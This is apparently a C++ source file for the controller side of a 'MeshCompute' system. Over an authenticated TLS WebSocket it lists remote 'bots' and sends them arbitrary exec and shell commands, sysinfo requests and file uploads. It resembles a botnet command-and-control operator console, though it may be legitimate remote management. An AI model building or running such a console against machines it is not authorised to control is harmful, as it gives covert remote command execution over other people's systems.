#include "mesh_controller.h"
#include <iostream>
#include <thread>
#include <sstream>
#include <regex>
#include <fstream>
#include <spdlog/spdlog.h>

using tcp = net::ip::tcp;
namespace websocket = boost::beast::websocket;

MeshController::MeshController(const std::string& server_url, const std::string& auth_token)
    : server_url_(server_url), auth_token_(auth_token),
      ssl_ctx_(net::ssl::context::tlsv12_client) {}

void MeshController::connect() {
    std::regex url_regex(R"(wss://([^:/]+):?(\d*)(/.*)?)");
    std::smatch match;
    if (!std::regex_match(server_url_, match, url_regex))
        throw std::runtime_error("Invalid server URL");
    std::string host = match[1];
    std::string port = match[2].length() ? match[2] : "443";
    tcp::resolver resolver(ioc_);
    auto results = resolver.resolve(host, port);
    ws_ = std::make_unique<websocket::stream<beast::ssl_stream<tcp::socket>>>(ioc_, ssl_ctx_);
    net::connect(ws_->next_layer().next_layer(), results.begin(), results.end());
    ws_->next_layer().handshake(net::ssl::stream_base::client);
    ws_->handshake(host, "/");
    do_auth();
    std::thread([this] { ioc_.run(); }).detach();
}

void MeshController::do_auth() {
    nlohmann::json auth;
    auth["type"] = "auth";
    auth["role"] = "controller";
    auth["token"] = auth_token_;
    ws_->write(net::buffer(auth.dump()));
    beast::flat_buffer buf;
    ws_->read(buf);
    auto resp = nlohmann::json::parse(beast::buffers_to_string(buf.data()));
    if (resp["type"] != "auth_ok") throw std::runtime_error("Authentication failed");
    spdlog::info("Controller authenticated");
}

void MeshController::read_loop() {
    beast::flat_buffer buf;
    while (true) {
        ws_->read(buf);
        handle_message(beast::buffers_to_string(buf.data()));
        buf.consume(buf.size());
    }
}

void MeshController::send(const std::string& msg) {
    ws_->write(net::buffer(msg));
}

void MeshController::handle_message(const std::string& msg) {
    auto j = nlohmann::json::parse(msg);
    std::cout << "[Server] " << j.dump(2) << std::endl;
}

void MeshController::interactive() {
    std::thread reader([this] { read_loop(); });
    std::string line;
    std::cout << "MeshCompute Controller. Type 'help' for commands.\n";
    while (std::getline(std::cin, line)) {
        if (line == "quit") break;
        if (line == "help") {
            std::cout << "Commands: list, exec <bot_id> <cmd>, shell <bot_id> <cmd>, sysinfo <bot_id>, upload <bot_id> <file>\n";
            continue;
        }
        std::istringstream iss(line);
        std::string cmd;
        iss >> cmd;
        if (cmd == "list") {
            send("{\"type\":\"list\"}");
        } else if (cmd == "exec") {
            std::string bot, cmdline;
            iss >> bot;
            std::getline(iss, cmdline);
            if (!bot.empty() && !cmdline.empty()) {
                nlohmann::json j;
                j["type"] = "exec";
                j["target"] = bot;
                j["command"] = cmdline.substr(1);
                send(j.dump());
            }
        } else if (cmd == "shell") {
            std::string bot, cmdline;
            iss >> bot;
            std::getline(iss, cmdline);
            if (!bot.empty() && !cmdline.empty()) {
                nlohmann::json j;
                j["type"] = "shell";
                j["target"] = bot;
                j["command"] = cmdline.substr(1);
                send(j.dump());
            }
        } else if (cmd == "sysinfo") {
            std::string bot;
            iss >> bot;
            if (!bot.empty()) {
                nlohmann::json j;
                j["type"] = "sysinfo";
                j["target"] = bot;
                send(j.dump());
            }
        } else if (cmd == "upload") {
            std::string bot, filepath;
            iss >> bot >> filepath;
            if (!bot.empty() && !filepath.empty()) {
                std::ifstream ifs(filepath, std::ios::binary);
                if (!ifs) {
                    std::cout << "File not found\n";
                    continue;
                }
                std::string content((std::istreambuf_iterator<char>(ifs)), {});
                nlohmann::json j;
                j["type"] = "upload";
                j["target"] = bot;
                j["filename"] = filepath.substr(filepath.find_last_of('/') + 1);
                j["data"] = content; // base64 encoding would be safer
                send(j.dump());
            }
        }
    }
    reader.join();
}